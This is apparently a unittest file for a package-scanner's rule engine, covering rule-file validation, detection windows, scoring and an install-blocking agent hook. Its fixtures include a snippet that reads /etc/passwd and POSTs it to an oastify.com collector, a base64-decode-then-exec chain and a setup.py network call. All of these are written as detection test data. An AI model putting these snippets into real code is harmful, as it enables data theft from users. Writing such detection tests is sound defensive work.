"""Rule files (guard/rules/*.json) + rule_engine: loading, validation, and "change the file, not the code"
(run: python3 tests/test_rule_engine.py)."""
import json
import os
import shutil
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

GUARD = Path(__file__).resolve().parents[1] / "guard"
sys.path.insert(0, str(GUARD))
import integrity  # noqa: E402
import rule_engine  # noqa: E402
import scan_engine as se  # noqa: E402


def copy_rules() -> Path:
    d = Path(tempfile.mkdtemp())
    for f in (GUARD / "rules").glob("*.json"):
        shutil.copy(f, d / f.name)
    return d


def edit(d: Path, name: str, fn) -> None:
    p = d / f"{name}.json"
    data = json.loads(p.read_text())
    fn(data)
    p.write_text(json.dumps(data, ensure_ascii=False))


def package(files: dict) -> list[Path]:
    root = Path(tempfile.mkdtemp()) / "pkg-1.0-py3-none-any.whl.unpacked"
    for rel, text in files.items():
        p = root / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(text)
    return sorted(root.rglob("*"))


def scan(rs, files, name="somepkg"):
    f = se.ScanFeatures(name=name, version="1.0")
    rule_engine.run_static(rs, files, f)
    rule_engine.typosquat(rs, name, f)
    f.has_readme, f.maintainer_count = True, 1
    return f, se.Verdict(*rule_engine.score_rules(rs, f), f)


class Loading(unittest.TestCase):
    def test_builtin_rules_load_and_are_consistent(self):
        rs = rule_engine.load()
        self.assertEqual(len({r["id"] for r in rs.rules}), len(rs.rules))
        self.assertTrue(all(r["detector"] in rule_engine.DETECTORS for r in rs.rules))
        self.assertEqual(rs.window_of("decode_then_exec"), se.CHAIN_LINE_WINDOW)

    def test_bad_files_are_refused_with_a_message(self):
        cases = [
            ("rules", lambda d: d["rules"].append({"id": "x", "detector": "nope"}), "unknown detector"),
            ("rules", lambda d: d["rules"].append({"id": "x", "detector": "chain", "first": "nosuch", "then": "exec",
                                                   "within_lines": 3}), "unknown signal"),
            ("rules", lambda d: d["rules"].append(dict(d["rules"][0])), "duplicate rule id"),
            ("signals", lambda d: d["signals"]["exec"].update(regex=["(unclosed"]), "bad pattern"),
            ("scoring", lambda d: d["hard_rules"][0].update(action="explode"), "unknown action"),
            ("scoring", lambda d: d.pop("thresholds"), "missing or bad value"),
            ("scoring", lambda d: d.update(schema=2), "unsupported schema"),
            ("post", lambda d: d["rules"].append({"id": "nosuch", "applies_to": "any", "verdict": "BLOCK"}), "unknown rule"),
            ("post", lambda d: d["rules"][0].update(verdict="DENY"), "unknown verdict"),
            ("post", lambda d: d["rules"][0].update(applies_to=["ALLOW", "MAYBE"]), "applies_to"),
            ("post", lambda d: d["rules"].append(dict(d["rules"][0])), "duplicate rule id"),
            ("post", lambda d: d["version_diff"].update(skip_paths="(unclosed"), "bad pattern"),
            ("post", lambda d: d.pop("late_file"), "missing or bad value"),
            ("scoring", lambda d: d["hard_rules"].append({"id": "x", "when": {"evidence": "nosuch"}, "action": "review",
                                                         "reason": "x"}), "no rule leaves"),
            ("rules", lambda d: next(r for r in d["rules"] if r["id"] == "exfil_endpoint").update(text="normalized"),
             "skip_docstrings"),
            ("rules", lambda d: next(r for r in d["rules"] if r["id"] == "keyword").update(files="text"), "files \"text\""),
        ]
        for name, fn, msg in cases:
            d = copy_rules()
            edit(d, name, fn)
            with self.assertRaises(rule_engine.RulesetError) as cm:
                rule_engine.load(d)
            self.assertIn(msg, str(cm.exception), name)
        d = copy_rules()
        (d / "scoring.json").unlink()
        with self.assertRaises(rule_engine.RulesetError):
            rule_engine.load(d)
        (d / "scoring.json").write_text("{not json")
        with self.assertRaises(rule_engine.RulesetError):
            rule_engine.load(d)

    def test_rule_files_are_self_protected(self):
        for f in ("rule_engine.py", "rules/signals.json", "rules/rules.json", "rules/scoring.json", "rules/post.json"):
            self.assertIn(f, integrity.PROTECTED_FILES)


class ChangeTheFileNotTheCode(unittest.TestCase):
    def test_new_keyword_is_found(self):
        files = package({"pkg/__init__.py": "def f():\n    return stealcookies()\n"})
        f, _ = scan(rule_engine.load(), files)
        self.assertEqual(f.keyword_total, 0)
        d = copy_rules()
        edit(d, "signals", lambda s: s["signals"]["dangerous_keywords"]["literals"].append("stealcookies("))
        f, v = scan(rule_engine.load(d), files)
        self.assertEqual(f.keyword_hits, {"stealcookies(": 1})
        self.assertTrue(any(e["rule"] == "keyword" and e["line"] == 2 for e in f.evidence))

    def test_chain_window_comes_from_the_file(self):
        body = "import base64\nx = base64.b64decode(p)\n" + "y = 1\n" * 10 + "exec(x)\n"
        files = package({"pkg/__init__.py": body})
        f, v = scan(rule_engine.load(), files)
        self.assertFalse(f.has_decode_then_exec)                  # 11 lines apart, window 8
        d = copy_rules()
        edit(d, "rules", lambda r: next(x for x in r["rules"] if x["id"] == "decode_then_exec").update(within_lines=12))
        edit(d, "scoring", lambda s: None)
        f, v = scan(rule_engine.load(d), files)
        self.assertTrue(f.has_decode_then_exec)
        self.assertEqual(v.verdict, "BLOCK")
        self.assertIn("within 12 lines", v.reasons[-1])                 # the reason text follows the rule's window

    def test_hard_rule_action_and_threshold_come_from_the_file(self):
        files = package({"setup.py": "import urllib.request\nurllib.request.urlopen('http://x')\n"})
        sdist = [p for p in files]
        root = sdist[0].parents[0]
        new_root = root.parent / "pkg-1.0.tar.gz.unpacked" / "pkg-1.0"
        new_root.mkdir(parents=True)
        shutil.copy(root / "setup.py", new_root / "setup.py")
        files = sorted(new_root.parent.rglob("*"))
        f, v = scan(rule_engine.load(), files)
        self.assertTrue(f.setup_network)
        self.assertEqual(v.verdict, "NEEDS_HUMAN_REVIEW")
        d = copy_rules()
        edit(d, "scoring", lambda s: next(h for h in s["hard_rules"] if h["id"] == "setup_network_or_shell").update(
            action="block", score="at_least_block"))
        f, v = scan(rule_engine.load(d), files)
        self.assertEqual(v.verdict, "BLOCK")
        d = copy_rules()
        edit(d, "scoring", lambda s: s["thresholds"].update(review=0.9, block=0.95))
        f, v = scan(rule_engine.load(d), files)
        self.assertEqual(v.score, 0.91)                           # review floor = review + margin


def run_with_rules(d: Path | None, code: str) -> dict:
    """Run `code` in a fresh interpreter whose guard modules load the rules from `d` (None = the built-in ones);
    the code assigns `out`, which comes back as JSON."""
    env = dict(os.environ, AASM_ML="0")
    if d is not None:
        env["AASM_RULES_DIR"] = str(d)
    prog = f"import sys, json\nsys.path.insert(0, {str(GUARD)!r})\n{code}\nprint(json.dumps(out))\n"
    p = subprocess.run([sys.executable, "-c", prog], capture_output=True, text=True, env=env, timeout=60)
    assert p.returncode == 0, p.stderr
    return json.loads(p.stdout)


POST_CASE = """
import post_rules, scan_engine as se
f = se.ScanFeatures(name="requets", version="1.0", fetch_ok=True)
f.min_edit_distance, f.closest_popular_name, f.package_age_days = 1, "requests", AGE
out = post_rules.apply(se.Verdict("ALLOW", 0.1, [], f))
"""


class PostRulesComeFromTheFile(unittest.TestCase):
    def test_verdict_order_and_numbers(self):
        self.assertEqual(run_with_rules(None, POST_CASE.replace("AGE", "3")),
                         ["NEEDS_HUMAN_REVIEW", {"rule": "typosquat", "of": "requests"}])
        d = copy_rules()                                          # typosquat raised to BLOCK
        edit(d, "post", lambda p: next(r for r in p["rules"] if r["id"] == "typosquat").update(verdict="BLOCK"))
        self.assertEqual(run_with_rules(d, POST_CASE.replace("AGE", "3"))[0], "BLOCK")
        d = copy_rules()                                          # new_package checked before typosquat
        edit(d, "post", lambda p: p["rules"].sort(key=lambda r: r["id"] != "new_package"))
        self.assertEqual(run_with_rules(d, POST_CASE.replace("AGE", "3"))[1], {"rule": "new_package", "days": 3})
        d = copy_rules()                                          # typosquat switched off, new package after 2 days
        edit(d, "post", lambda p: (p.update(rules=[r for r in p["rules"] if r["id"] != "typosquat"]),
                                   p["new_package"].update(days=2)))
        self.assertEqual(run_with_rules(d, POST_CASE.replace("AGE", "3")), ["ALLOW", None])
        d = copy_rules()                                          # a 3-day-old project counts as established
        edit(d, "post", lambda p: p["typosquat"].update(established_days=3))
        self.assertEqual(run_with_rules(d, POST_CASE.replace("AGE", "3"))[1], {"rule": "new_package", "days": 3})

    def test_version_diff_signal_list(self):
        code = """
import version_diff as VD
new = {"pkg/__init__.py": ["import pickle", "pickle.loads(BLOB)"]}
out = VD.signals(new, {"pkg/__init__.py": ["import pickle"]})
"""
        self.assertEqual(run_with_rules(None, code), [])
        d = copy_rules()
        edit(d, "post", lambda p: (p["version_diff"]["import_time"]["danger_prefixes"].append("pickle.loads"),
                                   p["version_diff"]["import_time"].update(quick=p["version_diff"]["import_time"]["quick"] + "|pickle")))
        self.assertEqual(run_with_rules(d, code),
                         [{"kind": "import_time", "file": "pkg/__init__.py", "detail": "pickle.loads"}])


class NewRuleReachesTheAgent(unittest.TestCase):
    def test_rule_file_report_text_is_used(self):
        import review_report
        from output import text_format
        files = package({"mypkg/__init__.py": "import urllib.request\n"
                         "info = open('/etc/passwd').read()\n"
                         "urllib.request.urlopen(urllib.request.Request('https://x.oastify.com/c', data=info.encode()))\n"})
        f, v = scan(rule_engine.load(), files)
        self.assertEqual(v.verdict, "BLOCK")
        rec = review_report.package_record("mypkg", "1.0", v)
        self.assertEqual(rec["evidence"][0]["rule"], "exfil_endpoint")              # a lead rule comes first
        self.assertEqual(rec["risk"], review_report.RULES["exfil_endpoint"]["risk"])
        self.assertIn("Data collector address", text_format.popup_line(rec))


class BrokenRulesNeverPass(unittest.TestCase):
    def test_hook_holds_the_install_with_the_rule_file_message(self):
        d = copy_rules()
        edit(d, "rules", lambda r: r["rules"].append({"id": "x", "detector": "nope"}))
        event = {"session_id": "t", "cwd": tempfile.mkdtemp(), "hook_event_name": "PreToolUse", "tool_name": "Bash",
                 "tool_input": {"command": "pip install six"}}
        env = dict(os.environ, AASM_RULES_DIR=str(d), AASM_MODE="auto", AASM_ML="0")
        p = subprocess.run([sys.executable, str(GUARD / "hooks" / "pretooluse_check.py")], input=json.dumps(event),
                           capture_output=True, text=True, env=env, timeout=120)
        out = json.loads(p.stdout)["hookSpecificOutput"]
        self.assertIn(out["permissionDecision"], ("ask", "deny"))
        self.assertIn("rule file error", out["permissionDecisionReason"])
        self.assertIn("unknown detector", out["permissionDecisionReason"])


if __name__ == "__main__":
    unittest.main()
